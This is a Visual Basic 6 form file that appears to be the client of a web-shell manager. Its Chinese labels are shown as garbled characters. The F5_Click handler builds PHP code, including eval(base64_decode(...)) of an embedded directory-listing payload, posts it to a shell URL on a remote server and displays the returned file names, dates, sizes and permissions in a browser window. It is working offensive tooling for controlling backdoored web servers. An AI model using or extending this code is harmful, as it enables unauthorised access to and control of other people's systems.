VERSION 5.00
Object = "{6B7E6392-850A-101B-AFC0-4210102A8DA7}#1.3#0"; "COMCTL32.OCX"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Begin VB.Form shellinfo 
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "Shell����"
   ClientHeight    =   8655
   ClientLeft      =   1275
   ClientTop       =   510
   ClientWidth     =   14745
   LinkTopic       =   "Form2"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   8655
   ScaleWidth      =   14745
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  '��Ļ����
   Begin VB.CommandButton F5 
      Caption         =   "ˢ��"
      Height          =   330
      Left            =   12915
      TabIndex        =   12
      Top             =   105
      Width           =   1320
   End
   Begin VB.CommandButton Command7 
      Caption         =   "Command7"
      Height          =   615
      Left            =   11370
      TabIndex        =   11
      Top             =   7710
      Width           =   2895
   End
   Begin VB.CommandButton Command6 
      Caption         =   "���ظ�Ŀ¼"
      Height          =   330
      Left            =   11505
      TabIndex        =   10
      Top             =   120
      Width           =   1320
   End
   Begin VB.CommandButton Command5 
      Caption         =   "����shell"
      Height          =   330
      Left            =   10125
      TabIndex        =   9
      Top             =   135
      Width           =   1320
   End
   Begin VB.CommandButton Command4 
      Caption         =   "����"
      Height          =   330
      Left            =   8745
      TabIndex        =   8
      Top             =   135
      Width           =   1320
   End
   Begin VB.CommandButton Command3 
      Caption         =   "��ת"
      Height          =   330
      Left            =   7320
      TabIndex        =   7
      Top             =   150
      Width           =   1320
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Command2"
      Height          =   555
      Left            =   12555
      TabIndex        =   5
      Top             =   6900
      Width           =   1785
   End
   Begin MSComctlLib.ImageList box2 
      Left            =   14250
      Top             =   1815
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      ImageWidth      =   16
      ImageHeight     =   16
      MaskColor       =   12632256
      UseMaskColor    =   0   'False
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   1
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "shellinfo.frx":0000
            Key             =   ""
         EndProperty
      EndProperty
   End
   Begin VB.CommandButton Command1 
      Caption         =   "����"
      Height          =   540
      Left            =   11295
      TabIndex        =   3
      Top             =   6915
      Width           =   1260
   End
   Begin MSComctlLib.ImageList box1 
      Left            =   14295
      Top             =   1365
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      ImageWidth      =   16
      ImageHeight     =   16
      MaskColor       =   12632256
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   2
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "shellinfo.frx":049A
            Key             =   ""
         EndProperty
         BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "shellinfo.frx":0934
            Key             =   ""
         EndProperty
      EndProperty
   End
   Begin VB.TextBox dirtext 
      BackColor       =   &H80000001&
      BeginProperty Font 
         Name            =   "����"
         Size            =   10.5
         Charset         =   134
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   1545
      Left            =   4875
      MultiLine       =   -1  'True
      TabIndex        =   2
      Text            =   "shellinfo.frx":2F0E
      Top             =   6885
      Width           =   6030
   End
   Begin ComctlLib.TreeView TreeView1 
      Height          =   6150
      Left            =   195
      TabIndex        =   1
      Top             =   630
      Width           =   4305
      _ExtentX        =   7594
      _ExtentY        =   10848
      _Version        =   327682
      Style           =   7
      Appearance      =   1
      MouseIcon       =   "shellinfo.frx":2F14
   End
   Begin VB.ComboBox Combo1 
      Height          =   300
      Left            =   180
      TabIndex        =   0
      Top             =   165
      Width           =   7035
   End
   Begin MSComctlLib.ListView ListView1 
      Height          =   5970
      Left            =   4635
      TabIndex        =   4
      Top             =   660
      Width           =   9735
      _ExtentX        =   17171
      _ExtentY        =   10530
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      _Version        =   393217
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   1
      NumItems        =   0
   End
   Begin MSComctlLib.ListView Collection 
      Height          =   1560
      Left            =   195
      TabIndex        =   6
      Top             =   6855
      Width           =   4365
      _ExtentX        =   7699
      _ExtentY        =   2752
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      _Version        =   393217
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   1
      NumItems        =   0
   End
End
Attribute VB_Name = "shellinfo"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Public infos As String
Public urlone As String
Private Function GetNextKey() As String
'Returns a new key value for each Node being added to the TreeView
'This algorithm is very simple and will limit you to adding a total of 999 nodes
'Each node needs a unique key. If you allow users to remove Nodes you can't use
'the Nodes count +1 as the key for a new node.

    Dim sNewKey As String
    Dim iHold As Integer
    Dim i As Integer
    On Error GoTo myerr
    'The next line will return error #35600 if there are no Nodes in the TreeView
    iHold = Val(TreeView1.Nodes(1).Key)
    For i = 1 To TreeView1.Nodes.Count
        If Val(TreeView1.Nodes(i).Key) > iHold Then
            iHold = Val(TreeView1.Nodes(i).Key)
        End If
    Next
    iHold = iHold + 1
    sNewKey = CStr(iHold) & "_"
    GetNextKey = sNewKey 'Return a unique key
    Exit Function
myerr:
    'Because the TreeView is empty return a 1 for the key of the first Node
    GetNextKey = "1_"
    Exit Function
End Function

Private Sub Command1_Click()
    Dim x
    x = ListView1.ListItems.Count + 1
    ListView1.ListItems.add , , x
    ListView1.ListItems(x).SubItems(1) = "00:00:00"
    ListView1.ListItems(x).SubItems(2) = "https://blog.csdn.net/glldc/article/details/88786929"
    ListView1.ListItems(x).SubItems(3) = "fone"
    '-------------------------------------------------------
    ListView1.ListItems.Clear               '����б�
    ListView1.ListItems.add , , "phpmyadmin", , 1
    'ListView1.ListItems.Add , , "1", , 1   '���ͼ�� �����Ǹ�1��ImageList1�ؼ��е�ͼ��������
    ListView1.ListItems(1).SubItems(1) = "1"
    ListView1.ListItems(1).SubItems(2) = "https://blog.csdn.net/glldc/article/details/88786929"
    ListView1.ListItems(1).SubItems(3) = "fone"
    ListView1.ListItems.add , , "GET", , 2
    ListView1.ListItems(2).SubItems(1) = "2"
    ListView1.ListItems(2).SubItems(2) = "https://blog.csdn.net/glldc/article/details/88786929"
    ListView1.ListItems(2).SubItems(3) = "fone"
        ListView1.ListItems.add , , "GET", , 2
    ListView1.ListItems(2).SubItems(1) = "3"
    ListView1.ListItems(2).SubItems(2) = "https://blog.csdn.net/glldc/article/details/88786929"
    ListView1.ListItems(2).SubItems(3) = "fone"
End Sub

Private Sub Command2_Click()
Dim x
    x = Collection.ListItems.Count + 1
    Collection.ListItems.add , , x & ":" & "HTTP://www.baidu.com", , 1
End Sub

Private Sub Command7_Click()

dirtext.text = infos
'MsgBox infos, , "��ʾ"

End Sub

Private Sub F5_Click()
ListView1.ListItems.Clear
Dim test1 As String

test1 = Mid(infos, InStr(Left(infos, 17), "|") + 1, 16)

Static runfun As String
Dim i As Long
Dim o As Long
Dim j As Variant
Dim tbin() As String
Dim capbin() As String

Dim m2 As String
Dim Ccount As Integer
Dim fun1(1 To 50) As String
Dim strone As String
Dim diritem() As String
Dim dirtext(0 To 3) As String
Dim binitem() As String
Dim bintext(0 To 3) As String
Dim items(1 To 30) As String
Dim bbb() As String
Dim t1 As String
Dim test4 As String
capbin = Split(infos, "|")
test4 = Left(capbin(1), InStrRev(capbin(1), ":"))
test4 = Left(test4, InStrRev(test4, "C") - 2)
m2 = "IGlmKCRGPT1OVUxMKXsKICAgICAgICAgZWNobygiRVJST1I6Ly8gUGF0aCBOb3QgRm91bmQgT3IgTm9QZXJtaXNzaW9uISIpOwogICAgfQogICAgZWxzZXsKICAgICAgICAkTT1OVUxMOwogICAgICAgICRMPU5VTEw7CiAgICAgICAgd2hpbGUoJE49QHJlYWRkaXIoJEYpKXsKICAgICAgICAgICAgJFA9JEQuIi8iLiROOwogICAgICAgICAgICAkVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTsKICAgICAgICAgICAgQCRFPXN1YnN0cihiYXNlX2NvbnZlcnQoQGZpbGVwZXJtcygkUCksMTAsOCksLTQpOwogICAgICAgICAgICAkUj0iXHQiLiRULiJcdCIuQGZpbGVzaXplKCRQKS4iXHQiLiRFLiIiOwogICAgICAgICAgICBpZihAaXNfZGlyKCRQKSkKICAgICAgICAgICAgICAgICAkTS49JE4uIi8iLiRSOwogICAgICAgICAgICBlbHNlIAogICAgICAgICAgICAgICAgICRMLj0iKioiLiROLiRSLiIqKiI7CiAgICAgICAgfQogICAgICAgZWNobyAkTS4kTDsKICAgICAgIEBjbG9zZWRpcigkRik7CiAgICB9OwplY2hvKCJ8PC0iKTsKZGllKCk7"
'�����1
fun1(1) = "echo('->|');;"
fun1(2) = "$D=('" & test4 & "')" & ";"
fun1(3) = "$F=@opendir($D);"
fun1(4) = "eval(base64_decode(" & Chr(34) & m2 & Chr(34) & "));"


For i = 1 To 50
runfun = runfun + fun1(i)
Next i
'MsgBox runfun, , "��ʾ"
'�����1����
strone = XMLHTTP_Post(urlone, runfun, , , 1)
'MsgBox strone
runfun = ""
For i = Len(strone) To 1 Step -1
If Mid(strone, i, 1) = "/" Then
t1 = i
Exit For
End If
Next
'Ŀ¼
Dim d1 As String
d1 = Left(strone, t1)
diritem = Split(d1, "/")


For i = 1 To UBound(diritem) - 1
    If (Mid(diritem(i), 22, 1) = 0) Then
        ListView1.ListItems.add , , Mid(diritem(i), 28), , 1
        dirtext(0) = Mid(diritem(i), 1, 21)
        dirtext(1) = Mid(diritem(i), 22, 1)
        dirtext(2) = Mid(diritem(i), 24, 4)
        ListView1.ListItems(i).SubItems(1) = dirtext(0)
        ListView1.ListItems(i).SubItems(2) = dirtext(1)
        ListView1.ListItems(i).SubItems(3) = dirtext(2)
    Else
        ListView1.ListItems.add , , Mid(diritem(i), 31), , 1
        dirtext(0) = Mid(diritem(i), 1, 21)
        dirtext(1) = Mid(diritem(i), 22, 4)
        dirtext(2) = Mid(diritem(i), 27, 4)
        ListView1.ListItems(i).SubItems(1) = dirtext(0)
        ListView1.ListItems(i).SubItems(2) = dirtext(1)
        ListView1.ListItems(i).SubItems(3) = dirtext(2)
    End If
 
Next i
'�ļ���ӵ�listview
Dim d2 As String
Dim d2f() As String
Dim Ȩ�� As String
Dim �ļ���ʼ As String
Dim �ļ��� As String
d2 = Mid(strone, t1)
'MsgBox d2, , "d2"
binitem = Split(d2, "**")

For i = 1 To UBound(binitem) - 1

If Len(binitem(i)) = 0 Then
    i = i + 1
    
End If
    �ļ���ʼ = ListView1.ListItems.Count
    �ļ��� = Left((Left(binitem(i), InStrRev(Left(binitem(i), Len(binitem(i)) - 4), ":") + 2)), Len((Left(binitem(i), InStrRev(Left(binitem(i), Len(binitem(i)) - 4), ":") + 2))) - 19)
    ListView1.ListItems.add , , �ļ���, , 2
    'ʱ��
    ListView1.ListItems(�ļ���ʼ + 1).SubItems(1) = Right(Left(binitem(i), InStrRev(Left(binitem(i), Len(binitem(i)) - 4), ":") + 2), 19)
    '��С
    ListView1.ListItems(�ļ���ʼ + 1).SubItems(2) = Left(Mid(binitem(i), Len(�ļ���) + 19), Len(Mid(binitem(i), Len(�ļ���) + 19)) - 4)
    'Ȩ��
    ListView1.ListItems(�ļ���ʼ + 1).SubItems(3) = Right(binitem(i), 4)
Next i





'�ļ���ӽ���
End Sub

Private Sub Form_Load()
    Dim DynArray() As String
    ListView1.ListItems.Clear                                                   '����б�                                           '����б�ͷ
    ListView1.View = lvwReport                                                  '�����б���ʾ��ʽ
    ListView1.LabelEdit = lvwManual                                             '��ֹ��ǩ�༭
    ListView1.FullRowSelect = True                                              'ѡ������
    
    Collection.ListItems.Clear                                                   '����б�                                           '����б�ͷ
    Collection.View = lvwReport                                                 '�����б���ʾ��ʽ
    Collection.LabelEdit = lvwManual                                             '��ֹ��ǩ�༭
    Collection.FullRowSelect = True                                              'ѡ������
     '��ʼ��������ͷ������Ŀ��ע�ⲻҪռ��100%������ֲ����۵ĺ��������
    ListView1.ColumnHeaders.add , , "����", 3000
    ListView1.ColumnHeaders.add , , "ʱ��", 2500
    ListView1.ColumnHeaders.add , , "��С", 800
    ListView1.ColumnHeaders.add , , "����", 1200
        Collection.ColumnHeaders.add , , "�ղص�ַ", 4300
    ListView1.SmallIcons = box1.Object
    Collection.SmallIcons = box2.Object
    Me.Caption = urlone & " " + infos
    dirtext.text = urlone + infos
    '����
    DynArray = (Split(dirtext.text))
    MsgBox DynArray(0)
    '�������
End Sub

Private Sub Text1_Change()

End Sub
Function ��ȡ�ļ���С(strbox As String)
strbox = Left(strbox, Len(strbox) - 4)
MsgBox strbox, , "��ȡ1"

End Function
